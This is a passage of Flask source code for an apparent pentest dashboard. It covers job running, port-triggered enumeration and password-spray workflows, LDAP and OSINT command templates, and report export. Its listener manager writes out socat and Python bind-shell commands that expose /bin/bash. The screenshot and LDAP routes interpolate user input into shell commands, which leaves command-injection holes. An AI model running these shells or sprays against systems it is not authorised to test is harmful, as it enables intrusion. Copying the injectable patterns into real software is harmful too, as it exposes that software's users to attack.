    ))

@app.route("/api/screenshots/<project_id>/<filename>")
@api_login_required
def serve_screenshot(project_id, filename):
    if (not re.match(r'^[\w\-]+$', project_id) or
            not re.match(r'^[\w\-\.]+\.(png|jpg|jpeg)$', filename)):
        return jsonify({"error": "Invalid"}), 400
    from flask import send_file as _sf
    f = SCREENSHOTS_DIR / project_id / filename
    if not f.exists():
        return jsonify({"error": "Not found"}), 404
    return _sf(str(f))

@app.route("/api/projects/<project_id>/screenshot", methods=["POST"])
@api_login_required
def take_screenshot(project_id):
    url = (request.json or {}).get("url", "").strip()
    if not url or not (url.startswith("http://") or url.startswith("https://")):
        return jsonify({"error": "Valid HTTP URL required"}), 400
    proj_dir = SCREENSHOTS_DIR / project_id
    proj_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"shot_{ts}.png"
    out = str(proj_dir / fname)
    cmd = f"gowitness scan single -u '{url}' --write-screenshots --screenshot-path '{proj_dir}' 2>&1 || gowitness single --url '{url}' --screenshot-path '{out}' 2>&1"
    job_id = str(uuid.uuid4())
    job = {
        "id": job_id, "project_id": project_id,
        "tool": f"Screenshot: {url[:50]}", "phase": "recon",
        "command": cmd, "status": "running", "output": [],
        "started_at": datetime.now().isoformat(), "finished_at": None,
        "pid": None, "return_code": None, "proc": None,
    }
    with JOBS_LOCK:
        JOBS[job_id] = job

    def _run():
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
            job["proc"] = proc
            job["pid"] = proc.pid
            for line in proc.stdout:
                job["output"].append(line.rstrip("\n"))
            proc.wait()
            job["return_code"] = proc.returncode
            if job["status"] == "running":
                job["status"] = "completed" if proc.returncode == 0 else "error"
        except Exception as e:
            job["output"].append(f"[ERROR] {e}")
            job["status"] = "error"
        finally:
            job["finished_at"] = datetime.now().isoformat()
            job.pop("proc", None)

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id, "filename": fname}), 202


# ── Job helper ────────────────────────────────────────────────────────────

def _run_job(command, project_id, tool="Custom", phase="custom"):
    job_id = str(uuid.uuid4())
    job = {
        "id": job_id, "project_id": project_id,
        "tool": tool, "phase": phase, "command": command,
        "status": "running", "output": [],
        "started_at": datetime.now().isoformat(), "finished_at": None,
        "pid": None, "return_code": None, "proc": None,
    }
    with JOBS_LOCK:
        JOBS[job_id] = job
    def _run():
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
            job["proc"] = proc; job["pid"] = proc.pid
            for line in proc.stdout:
                job["output"].append(line.rstrip("\n"))
            proc.wait(); job["return_code"] = proc.returncode
            if job["status"] == "running":
                job["status"] = "completed" if proc.returncode == 0 else "error"
        except Exception as e:
            job["output"].append(f"[ERROR] {e}"); job["status"] = "error"
        finally:
            job["finished_at"] = datetime.now().isoformat(); job.pop("proc", None)
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id}), 202


# ── Smart Automation Engine ────────────────────────────────────────────────

AUTO_RULES = [
    {"id": "web_auto",   "name": "Web Enum Auto",      "trigger_ports": [80,443,8080,8443,8000,8888,8008], "workflow": "web_enum",      "icon": "fa-globe",       "color": "#f0883e", "enabled": True},
    {"id": "smb_auto",   "name": "SMB Enum Auto",      "trigger_ports": [445,139],                          "workflow": "smb_enum",      "icon": "fa-folder-open", "color": "#d29922", "enabled": True},
    {"id": "ad_auto",    "name": "AD Recon Auto",       "trigger_ports": [389,636,3268,88],                 "workflow": "ad_recon",      "icon": "fa-sitemap",     "color": "#f85149", "enabled": True},
    {"id": "spray_auto", "name": "Password Spray Auto", "trigger_ports": [22,21,445,3389],                  "workflow": "password_spray","icon": "fa-key",         "color": "#8b949e", "enabled": False},
]
AUTO_RULES_LOCK = threading.Lock()

@app.route("/api/automation/rules")
@api_login_required
def get_auto_rules():
    return jsonify(AUTO_RULES)

@app.route("/api/automation/rules/<rule_id>/toggle", methods=["POST"])
@api_login_required
def toggle_auto_rule(rule_id):
    with AUTO_RULES_LOCK:
        for rule in AUTO_RULES:
            if rule["id"] == rule_id:
                rule["enabled"] = not rule.get("enabled", True)
                return jsonify(rule)
    return jsonify({"error": "Not found"}), 404

@app.route("/api/automation/trigger", methods=["POST"])
@api_login_required
def trigger_automation():
    data = request.json or {}
    ports = set(data.get("ports", []))
    project_id = data.get("project_id", "")
    vars_dict = data.get("vars", {})
    triggered = []

    for rule in AUTO_RULES:
        if not rule.get("enabled"):
            continue
        if not (ports & set(rule["trigger_ports"])):
            continue
        wf = next((w for w in WORKFLOWS if w["id"] == rule["workflow"]), None)
        if not wf:
            continue
        wf_run_id = str(uuid.uuid4())
        def _run_wf(workflow=wf, vd=vars_dict, pid=project_id, wrid=wf_run_id):
            for step in workflow["steps"]:
                cmd = step["command"]
                for k, v in vd.items():
                    cmd = cmd.replace(f"{{{k}}}", v)
                job_id = str(uuid.uuid4())
                job = {
                    "id": job_id, "project_id": pid,
                    "tool": step["name"], "phase": "automation",
                    "command": cmd, "status": "running", "output": [],
                    "started_at": datetime.now().isoformat(), "finished_at": None,
                    "pid": None, "return_code": None, "proc": None,
                    "workflow_id": wrid, "workflow_name": workflow["name"],
                }
                with JOBS_LOCK:
                    JOBS[job_id] = job
                try:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
                    job["proc"] = proc; job["pid"] = proc.pid
                    for line in proc.stdout:
                        job["output"].append(line.rstrip("\n"))
                    proc.wait(); job["return_code"] = proc.returncode
                    if job["status"] == "running":
                        job["status"] = "completed" if proc.returncode == 0 else "error"
                except Exception as e:
                    job["output"].append(f"[ERROR] {e}"); job["status"] = "error"
                finally:
                    job["finished_at"] = datetime.now().isoformat(); job.pop("proc", None)
        threading.Thread(target=_run_wf, daemon=True).start()
        triggered.append({"rule_id": rule["id"], "rule_name": rule["name"], "workflow_id": wf_run_id})

    return jsonify({"triggered": triggered, "count": len(triggered)})


# ── CVE / Exploit Matcher ─────────────────────────────────────────────────

@app.route("/api/exploits/search", methods=["POST"])
@api_login_required
def search_exploits():
    query = (request.json or {}).get("query", "").strip()
    if not query or len(query) < 2:
        return jsonify({"error": "Query too short"}), 400
    query_safe = re.sub(r'[^a-zA-Z0-9 \.\-\_]', '', query)[:100]
    try:
        result = subprocess.run(
            ["searchsploit", "--json", query_safe],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout)
            exploits = data.get("RESULTS_EXPLOIT", []) + data.get("RESULTS_SHELLCODE", [])
            out = [{"title": e.get("Title",""), "edb_id": e.get("EDB-ID",""),
                    "date": e.get("Date",""), "type": e.get("Type",""),
                    "platform": e.get("Platform",""), "path": e.get("Path","")}
                   for e in exploits[:60]]
            return jsonify({"results": out, "query": query_safe, "total": len(exploits)})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Timeout"}), 504
    except Exception:
        pass
    # Text fallback
    try:
        result = subprocess.run(["searchsploit", query_safe],
            capture_output=True, text=True, timeout=10)
        lines = [l for l in result.stdout.split('\n') if '|' in l and l.strip() and not l.startswith('-') and not l.startswith('Exploi')]
        out = []
        for line in lines[:60]:
            parts = line.split('|', 1)
            if len(parts) == 2:
                out.append({"title": parts[0].strip(), "path": parts[1].strip(),
                            "edb_id": "", "type": "", "platform": "", "date": ""})
        return jsonify({"results": out, "query": query_safe, "total": len(out)})
    except Exception as e:
        return jsonify({"results": [], "query": query_safe, "note": f"searchsploit no disponible: {e}"})


# ── Listener / Session Manager ─────────────────────────────────────────────

LISTENERS: dict = {}
LISTENERS_LOCK = threading.Lock()

@app.route("/api/listeners", methods=["GET"])
@api_login_required
def list_listeners():
    project_id = request.args.get("project_id", "")
    with LISTENERS_LOCK:
        result = [
            {k: v for k, v in l.items() if k != "proc"}
            for l in LISTENERS.values()
            if not project_id or l.get("project_id") == project_id
        ]
    return jsonify(sorted(result, key=lambda x: x.get("started_at", ""), reverse=True))

@app.route("/api/listeners", methods=["POST"])
@api_login_required
def create_listener():
    data = request.json or {}
    ltype = data.get("type", "nc")
    port = int(data.get("port", 4444))
    project_id = data.get("project_id", "")
    if port < 1 or port > 65535:
        return jsonify({"error": "Invalid port"}), 400
    listener_id = str(uuid.uuid4())
    cmds = {
        "nc":     f"nc -lvnp {port}",
        "rlwrap": f"rlwrap nc -lvnp {port}",
        "socat":  f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane",
        "python": f"python3 -c \"import socket,os,subprocess; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',{port})); s.listen(5); print('Listening on :{port}'); c,a=s.accept(); print(f'Connection from {{a}}'); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); subprocess.call(['/bin/bash','-i'])\"",
    }
    cmd = cmds.get(ltype, f"nc -lvnp {port}")
    listener = {
        "id": listener_id, "type": ltype, "port": port,
        "project_id": project_id, "command": cmd,
        "status": "listening", "started_at": datetime.now().isoformat(),
        "connections": [], "proc": None, "pid": None,
    }
    with LISTENERS_LOCK:
        LISTENERS[listener_id] = listener
    def _run():
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
            listener["proc"] = proc; listener["pid"] = proc.pid
            for line in proc.stdout:
                stripped = line.rstrip("\n")
                if any(kw in stripped.lower() for kw in ["connect", "connection from", "received", "open"]):
                    listener["connections"].append({"ts": datetime.now().isoformat(), "line": stripped})
            proc.wait()
            if listener["status"] == "listening":
                listener["status"] = "closed"
        except Exception:
            listener["status"] = "error"
        finally:
            listener["finished_at"] = datetime.now().isoformat()
            listener.pop("proc", None)
    threading.Thread(target=_run, daemon=True).start()
    safe = {k: v for k, v in listener.items() if k != "proc"}
    return jsonify(safe), 201

@app.route("/api/listeners/<listener_id>", methods=["DELETE"])
@api_login_required
def kill_listener(listener_id):
    with LISTENERS_LOCK:
        listener = LISTENERS.get(listener_id)
        if not listener:
            return jsonify({"error": "Not found"}), 404
        proc = listener.get("proc")
        if proc:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
        listener["status"] = "killed"
        listener["finished_at"] = datetime.now().isoformat()
        LISTENERS.pop(listener_id, None)
    return jsonify({"ok": True})


# ── BloodHound Visualizer ─────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/bloodhound", methods=["GET"])
@api_login_required
def get_bloodhound(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project.get("bloodhound", {"nodes": [], "edges": []}))

@app.route("/api/projects/<project_id>/bloodhound", methods=["PUT"])
@api_login_required
def save_bloodhound(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["bloodhound"] = request.json
    write_project(project)
    return jsonify({"ok": True})


# ── AD Explorer ───────────────────────────────────────────────────────────

AD_QUERIES = {
    "base":       "ldapsearch -x -H ldap://{dc} -b '' -s base namingContexts 2>/dev/null",
    "users_anon": "ldapsearch -x -H ldap://{dc} -b 'DC={dcparts}' '(objectClass=user)' sAMAccountName cn 2>/dev/null",
    "users":      "ldapsearch -x -H ldap://{dc} -D '{user}@{domain}' -w '{pass}' -b 'DC={dcparts}' '(objectClass=user)' sAMAccountName cn mail memberOf 2>/dev/null",
    "groups_anon":"ldapsearch -x -H ldap://{dc} -b 'DC={dcparts}' '(objectClass=group)' cn 2>/dev/null",
    "groups":     "ldapsearch -x -H ldap://{dc} -D '{user}@{domain}' -w '{pass}' -b 'DC={dcparts}' '(objectClass=group)' cn member 2>/dev/null",
    "computers":  "ldapsearch -x -H ldap://{dc} -D '{user}@{domain}' -w '{pass}' -b 'DC={dcparts}' '(objectClass=computer)' cn dNSHostName operatingSystem 2>/dev/null",
    "admins":     "ldapsearch -x -H ldap://{dc} -b 'DC={dcparts}' '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC={dcparts}))' sAMAccountName cn 2>/dev/null",
    "spns":       "ldapsearch -x -H ldap://{dc} -D '{user}@{domain}' -w '{pass}' -b 'DC={dcparts}' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName 2>/dev/null",
    "gpos":       "ldapsearch -x -H ldap://{dc} -D '{user}@{domain}' -w '{pass}' -b 'CN=Policies,CN=System,DC={dcparts}' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath 2>/dev/null",
    "asrep":      "ldapsearch -x -H ldap://{dc} -b 'DC={dcparts}' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName 2>/dev/null",
}

@app.route("/api/projects/<project_id>/ad_explore", methods=["POST"])
@api_login_required
def ad_explore(project_id):
    data = request.json or {}
    query_type = data.get("query", "base")
    dc_ip = data.get("dc", "").strip()
    domain = data.get("domain", "").strip()
    ad_user = data.get("user", "").strip()
    ad_pass = data.get("password", "").strip()
    if query_type not in AD_QUERIES:
        return jsonify({"error": "Unknown query type"}), 400
    if not dc_ip or not re.match(r'^[\w\.\-]+$', dc_ip):
        return jsonify({"error": "DC IP required"}), 400
    dc_parts = ("DC=" + ",DC=".join(domain.split("."))) if domain else "DC=domain,DC=local"
    cmd = AD_QUERIES[query_type]
    cmd = (cmd.replace("{dc}", dc_ip).replace("{domain}", domain or "domain.local")
           .replace("{dcparts}", dc_parts).replace("{user}", ad_user).replace("{pass}", ad_pass))
    return _run_job(cmd, project_id, tool=f"LDAP: {query_type}", phase="ad_attacks")


# ── OSINT Dashboard ───────────────────────────────────────────────────────

OSINT_TOOLS = {
    "harvester":  "theHarvester -d {domain} -b all -l 200 2>/dev/null",
    "subfinder":  "subfinder -d {domain} -silent 2>/dev/null",
    "dnsx":       "dnsx -d {domain} -a -cname -mx -txt -resp -silent 2>/dev/null",
    "amass":      "amass enum -passive -d {domain} 2>/dev/null",
    "whois":      "whois {domain} 2>/dev/null",
    "dnsrecon":   "dnsrecon -d {domain} 2>/dev/null",
    "wafw00f":    "wafw00f http://{domain} 2>/dev/null",
    "nuclei_web": "nuclei -u http://{domain} -severity critical,high,medium -j 2>/dev/null",
    "ctfr":       "ctfr.py -d {domain} 2>/dev/null",
    "gau":        "gau {domain} 2>/dev/null | head -200",
}

@app.route("/api/projects/<project_id>/osint/run", methods=["POST"])
@api_login_required
def osint_run(project_id):
    data = request.json or {}
    tool_id = data.get("tool", "").strip()
    domain = data.get("domain", "").strip()
    if not domain or not tool_id or tool_id not in OSINT_TOOLS:
        return jsonify({"error": "tool and domain required"}), 400
    if not re.match(r'^[a-zA-Z0-9\.\-\_]+$', domain):
        return jsonify({"error": "Invalid domain"}), 400
    cmd = OSINT_TOOLS[tool_id].replace("{domain}", domain)
    return _run_job(cmd, project_id, tool=f"OSINT: {tool_id}", phase="osint")

# ── Snippets Library ──────────────────────────────────────────────────────

SNIPPETS_FILE = BASE_DIR / "data" / "snippets.json"

def load_snippets():
    if SNIPPETS_FILE.exists():
        with open(SNIPPETS_FILE, encoding="utf-8") as f:
            return json.load(f)
    return []

def save_snippets_file(snippets):
    SNIPPETS_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(SNIPPETS_FILE, "w", encoding="utf-8") as f:
        json.dump(snippets, f, indent=2, ensure_ascii=False)

@app.route("/api/snippets", methods=["GET"])
@api_login_required
def list_snippets():
    q = request.args.get("q", "").lower().strip()
    cat = request.args.get("category", "").strip()
    snippets = load_snippets()
    if q:
        snippets = [s for s in snippets if q in s.get("title","").lower()
                    or q in s.get("command","").lower()
                    or q in s.get("notes","").lower()]
    if cat:
        snippets = [s for s in snippets if s.get("category","") == cat]
    return jsonify(sorted(snippets, key=lambda s: s.get("created_at",""), reverse=True))

@app.route("/api/snippets", methods=["POST"])
@api_login_required
def create_snippet():
    d = request.json or {}
    if not d.get("title") or not d.get("command"):
        return jsonify({"error": "title and command required"}), 400
    snippet = {
        "id": str(uuid.uuid4()),
        "title": d["title"],
        "command": d["command"],
        "category": d.get("category", "custom"),
        "tags": d.get("tags", []),
        "notes": d.get("notes", ""),
        "created_at": datetime.now().isoformat(),
    }
    snippets = load_snippets()
    snippets.append(snippet)
    save_snippets_file(snippets)
    return jsonify(snippet), 201

@app.route("/api/snippets/<snippet_id>", methods=["PUT"])
@api_login_required
def update_snippet(snippet_id):
    snippets = load_snippets()
    for i, s in enumerate(snippets):
        if s["id"] == snippet_id:
            for k, v in (request.json or {}).items():
                if k not in ("id", "created_at"):
                    snippets[i][k] = v
            save_snippets_file(snippets)
            return jsonify(snippets[i])
    return jsonify({"error": "Not found"}), 404

@app.route("/api/snippets/<snippet_id>", methods=["DELETE"])
@api_login_required
def delete_snippet(snippet_id):
    save_snippets_file([s for s in load_snippets() if s["id"] != snippet_id])
    return jsonify({"ok": True})


# ── PDF Export ─────────────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/report/pdf")
@api_login_required
def export_pdf_report(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    html = _generate_html_report(project)
    safe_name = project["name"].replace(" ", "_").replace("/", "_")

    # Try weasyprint
    try:
        import weasyprint
        pdf_bytes = weasyprint.HTML(string=html).write_pdf()
        resp = make_response(pdf_bytes)
        resp.headers["Content-Type"] = "application/pdf"
        resp.headers["Content-Disposition"] = f'attachment; filename="{safe_name}_report.pdf"'
        return resp
    except ImportError:
        pass

    # Try wkhtmltopdf
    try:
        import tempfile, os as _os
        with tempfile.NamedTemporaryFile(suffix=".html", mode="w", encoding="utf-8", delete=False) as f:
            f.write(html); html_path = f.name
        pdf_path = html_path.replace(".html", ".pdf")
        r = subprocess.run(["wkhtmltopdf", "--quiet", html_path, pdf_path],
                           capture_output=True, timeout=30)
        if r.returncode == 0 and _os.path.exists(pdf_path):
            with open(pdf_path, "rb") as f:
                pdf_bytes = f.read()
            _os.unlink(html_path); _os.unlink(pdf_path)
            resp = make_response(pdf_bytes)
            resp.headers["Content-Type"] = "application/pdf"
            resp.headers["Content-Disposition"] = f'attachment; filename="{safe_name}_report.pdf"'
            return resp
        try: _os.unlink(html_path)
        except: pass
    except Exception:
        pass

    # Fallback: open HTML with print dialog
    html_print = html.replace("</body>", "<script>window.onload=function(){window.print();}</script></body>")
    resp = make_response(html_print)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    resp.headers["Content-Disposition"] = f'inline; filename="{safe_name}_print.html"'
    return resp


# ── Scan Comparison Report ────────────────────────────────────────────────────

@app.route("/api/projects/<project_id>/compare/<baseline_id>")
@api_login_required
def compare_scans(project_id, baseline_id):
    """Compare current scan findings against a baseline scan — show new, fixed, and persisting."""
    current = read_project(project_id)
    baseline = read_project(baseline_id)
    if not current or not baseline:
        return jsonify({"error": "Project not found"}), 404

    cur_findings = {f.get("title", ""): f for f in current.get("findings", [])}
    base_findings = {f.get("title", ""): f for f in baseline.get("findings", [])}

    new_findings     = [f for t, f in cur_findings.items() if t not in base_findings]
    fixed_findings   = [f for t, f in base_findings.items() if t not in cur_findings]
    persist_findings = [f for t, f in cur_findings.items() if t in base_findings]

    SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

    def _sev_counts(lst):
        return {s: sum(1 for f in lst if f.get("severity") == s)
                for s in SEV_ORDER}

    return jsonify({
        "current_project": current.get("name"),
        "baseline_project": baseline.get("name"),
        "summary": {
            "new_count":     len(new_findings),
            "fixed_count":   len(fixed_findings),
            "persisting_count": len(persist_findings),
            "regression": len(new_findings) > len(fixed_findings),
        },
        "new": sorted(new_findings, key=lambda f: SEV_ORDER.get(f.get("severity"), 4)),
        "fixed": sorted(fixed_findings, key=lambda f: SEV_ORDER.get(f.get("severity"), 4)),
        "persisting": sorted(persist_findings, key=lambda f: SEV_ORDER.get(f.get("severity"), 4)),
        "new_sev_counts": _sev_counts(new_findings),
        "fixed_sev_counts": _sev_counts(fixed_findings),
    })


# ── Word (.docx) Report ────────────────────────────────────────────────────────

def _ai_report_narrative(project):
    """Call Claude API for an AI-written executive summary. Falls back to template if unavailable."""
    import os, urllib.request as _ureq
    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        return None
    findings = project.get("findings", [])
    loot = project.get("loot", [])
    proj_name = project.get("name", "Target")
    from collections import Counter
    sev_counts = Counter(f.get("severity", "info") for f in findings)
    crit_findings = [f["title"] for f in findings if f.get("severity") in ("critical", "high")][:8]
    creds_count = sum(1 for l in loot if l.get("type") == "credential")
    prompt = (
        f"Eres un consultor senior de ciberseguridad. Redacta el resumen ejecutivo de un informe de "
        f"test de intrusión en español para el cliente '{proj_name}'. "
        f"Hallazgos: {dict(sev_counts)}. "
        f"Principales hallazgos: {crit_findings}. "
        f"Credenciales capturadas: {creds_count}. "
        f"Escribe 3-4 párrafos profesionales en español. Tono ejecutivo, no técnico. "
        f"No uses markdown. Solo texto plano."
    )
    try:
        body = json.dumps({
            "model": "claude-haiku-4-5-20251001",
            "max_tokens": 600,
            "messages": [{"role": "user", "content": prompt}]
        }).encode()
        req = _ureq.Request(
            "https://api.anthropic.com/v1/messages",
            data=body,
            headers={
                "Content-Type": "application/json",
                "x-api-key": api_key,
                "anthropic-version": "2023-06-01",
            },
            method="POST"
        )
        with _ureq.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
            text = data.get("content", [{}])[0].get("text", "").strip()
            if text and len(text) > 100:
                return text
    except Exception:
        pass
    return None


def _generate_executive_paragraph(findings):
    """Generate a professional narrative paragraph for the executive summary."""
    from collections import Counter
    sev_counts = Counter(f.get("severity", "info") for f in findings)
    crits = sev_counts.get("critical", 0)
    highs = sev_counts.get("high", 0)
    meds  = sev_counts.get("medium", 0)
    lows  = sev_counts.get("low", 0)
    total = len(findings)

    if total == 0:
        return ("La evaluación de seguridad no identificó vulnerabilidades explotables en el perímetro analizado. "
                "Se recomienda mantener el ciclo de revisión periódica y aplicar las buenas prácticas de hardening.")

    risk_level = "CRÍTICO" if crits > 0 else "ALTO" if highs > 0 else "MEDIO" if meds > 0 else "BAJO"

    parts = [
        f"La evaluación de seguridad identificó un total de {total} hallazgo{'s' if total != 1 else ''}, "
        f"con un nivel de riesgo global valorado como {risk_level}."
    ]

    if crits:
        rce_found = any(re.search(r'rce|exploit.*confirm|shell.*root|backdoor', f.get("title",""), re.I)
                        for f in findings if f.get("severity") == "critical")
        parts.append(
            f"Se han detectado {crits} vulnerabilidad{'es' if crits != 1 else ''} de severidad CRÍTICA "
            + ("que permiten la ejecución remota de código sin autenticación, comprometiendo la confidencialidad, "
               "integridad y disponibilidad total del sistema." if rce_found else
               "que suponen un riesgo grave para la organización y requieren remediación inmediata.")
        )
    if highs:
        parts.append(
            f"Adicionalmente, se identificaron {highs} hallazgo{'s' if highs != 1 else ''} de severidad ALTA "
            "que podrían ser explotados para obtener acceso no autorizado o escalar privilegios."
        )
    if meds:
        parts.append(
            f"Se registraron {meds} hallazgo{'s' if meds != 1 else ''} de severidad MEDIA "
            "que, aunque requieren condiciones adicionales para su explotación, deben ser abordados en el plan de remediación."
        )

    creds_found = any(f.get("type") == "credential" for f in findings) or \
                  any(re.search(r'credencial|password|ntlm|hash', f.get("title",""), re.I) for f in findings)
    if creds_found:
        parts.append("Se han capturado credenciales durante la evaluación, lo que evidencia una debilidad en la gestión de contraseñas.")

    parts.append(
        "Se recomienda abordar las vulnerabilidades críticas y altas de forma inmediata, "
        "siguiendo el roadmap de remediación incluido en este informe."
    )
    return " ".join(parts)


def _docx_set_cell_bg(cell, hex_color):
    """Set background color of a docx table cell."""
    from docx.oxml.ns import qn
    from docx.oxml import OxmlElement
    tc = cell._tc
    tcPr = tc.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:fill'), hex_color)
    tcPr.append(shd)


def _generate_docx_report(project):
    """Generate a professional Word (.docx) pentest report. Returns bytes."""
    from io import BytesIO
    try:
        from docx import Document
        from docx.shared import Pt, RGBColor, Inches, Cm
        from docx.enum.text import WD_ALIGN_PARAGRAPH
        from docx.oxml.ns import qn
        from docx.oxml import OxmlElement
    except ImportError:
        raise ImportError("python-docx not installed. Run: pip install python-docx")

    SEV_ORDER  = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    SEV_HEX    = {"critical": "C0392B", "high": "E67E22", "medium": "F1C40F", "low": "27AE60", "info": "3498DB"}
    SEV_LABEL  = {"critical": "CRÍTICO", "high": "ALTO", "medium": "MEDIO", "low": "BAJO", "info": "INFO"}
    SEV_EFFORT = {"critical": "Inmediato (24-48h)", "high": "Urgente (1-2 semanas)",
                  "medium": "Planificado (1 mes)", "low": "Siguiente ciclo", "info": "Informativo"}

    findings = sorted(project.get("findings", []), key=lambda f: SEV_ORDER.get(f.get("severity","info"), 4))
    loot     = project.get("loot", [])
    now      = datetime.now().strftime("%d/%m/%Y")
    client   = project.get("client") or project.get("name") or "—"
    targets  = ", ".join(project.get("targets") or []) or "—"
    scope    = project.get("scope") or "Toda la infraestructura en scope definida por el cliente."

    doc = Document()

    # Márgenes
    for section in doc.sections:
        section.top_margin    = Cm(2.5)
        section.bottom_margin = Cm(2.5)
        section.left_margin   = Cm(3.0)
        section.right_margin  = Cm(2.5)

    # Fuente por defecto
    doc.styles["Normal"].font.name = "Calibri"
    doc.styles["Normal"].font.size = Pt(10.5)

    # ── PORTADA ──────────────────────────────────────────────────────────────
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run("\n\n\n")

    title_p = doc.add_paragraph()
    title_p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    t = title_p.add_run("INFORME DE AUDITORÍA DE SEGURIDAD")
    t.font.size = Pt(26)
    t.font.bold = True
    t.font.color.rgb = RGBColor(0x1A, 0x1A, 0x2E)

    sub_p = doc.add_paragraph()
    sub_p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    s = sub_p.add_run(project.get("name") or "Penetration Test")
    s.font.size = Pt(16)
    s.font.color.rgb = RGBColor(0x3F, 0xB9, 0x50)

    doc.add_paragraph()

    meta_table = doc.add_table(rows=4, cols=2)
    meta_table.style = "Table Grid"
    meta_rows = [
        ("Cliente", client),
        ("Fecha del informe", now),
        ("Targets", targets),
        ("Alcance", scope[:200]),
    ]
    for i, (k, v) in enumerate(meta_rows):
        meta_table.rows[i].cells[0].text = k
        meta_table.rows[i].cells[0].paragraphs[0].runs[0].font.bold = True
        meta_table.rows[i].cells[1].text = v

    doc.add_page_break()

    # ── RESUMEN EJECUTIVO ─────────────────────────────────────────────────────
    doc.add_heading("1. Resumen Ejecutivo", level=1)

    # Tabla de conteos
    sev_counts = {s: sum(1 for f in findings if f.get("severity") == s)
                  for s in ("critical", "high", "medium", "low", "info")}
    ct = doc.add_table(rows=2, cols=5)
    ct.style = "Table Grid"
    headers = ["CRÍTICO", "ALTO", "MEDIO", "BAJO", "INFO"]
    colors  = ["C0392B", "E67E22", "D4AC0D", "27AE60", "3498DB"]
    keys    = ["critical", "high", "medium", "low", "info"]
    for col_idx, (header, color, key) in enumerate(zip(headers, colors, keys)):
        hdr_cell = ct.rows[0].cells[col_idx]
        hdr_cell.text = header
        r = hdr_cell.paragraphs[0].runs[0]
        r.font.bold = True; r.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
        _docx_set_cell_bg(hdr_cell, color)
        hdr_cell.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.CENTER

        val_cell = ct.rows[1].cells[col_idx]
        val_cell.text = str(sev_counts.get(key, 0))
        rv = val_cell.paragraphs[0].runs[0]
        rv.font.size = Pt(20); rv.font.bold = True
        val_cell.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.CENTER

    doc.add_paragraph()
    _ai_text = _ai_report_narrative(project)
    exec_para = doc.add_paragraph(_ai_text if _ai_text else _generate_executive_paragraph(findings))
    exec_para.paragraph_format.space_after = Pt(6)

    doc.add_page_break()

    # ── METODOLOGÍA ───────────────────────────────────────────────────────────
    doc.add_heading("2. Metodología", level=1)
    doc.add_paragraph(
        "La auditoría se ha realizado siguiendo las fases estándar de una prueba de penetración (Penetration Test): "
        "reconocimiento (OSINT y descubrimiento de activos), enumeración de servicios, análisis de vulnerabilidades "
        "(escáner automático + pruebas manuales), explotación controlada, post-explotación y documentación de hallazgos. "
        "La metodología se basa en los estándares PTES (Penetration Testing Execution Standard), OWASP Testing Guide v4 "
        "y NIST SP 800-115."
    )
    doc.add_paragraph(
        f"El alcance definido incluye: {scope}"
    )

    doc.add_page_break()

    # ── HALLAZGOS ─────────────────────────────────────────────────────────────
    doc.add_heading(f"3. Hallazgos ({len(findings)})", level=1)

    if not findings:
        doc.add_paragraph("No se han registrado hallazgos durante la evaluación.")
    else:
        for idx, f in enumerate(findings, start=1):
            sev   = f.get("severity", "info")
            color = SEV_HEX.get(sev, "888888")
            label = SEV_LABEL.get(sev, sev.upper())

            # Título del finding con badge de severidad
            h = doc.add_heading(f"3.{idx} {f.get('title','Sin título')}", level=2)
            h.runs[0].font.color.rgb = RGBColor(
                int(color[:2],16), int(color[2:4],16), int(color[4:],16))

            # Tabla de metadatos
            meta_rows_f = [("Severidad", label)]
            if f.get("cvss_vector"):
                meta_rows_f.append(("CVSS v3.1", f["cvss_vector"]))
                if f.get("cvss") is not None:
                    meta_rows_f.append(("Score", str(f["cvss"])))
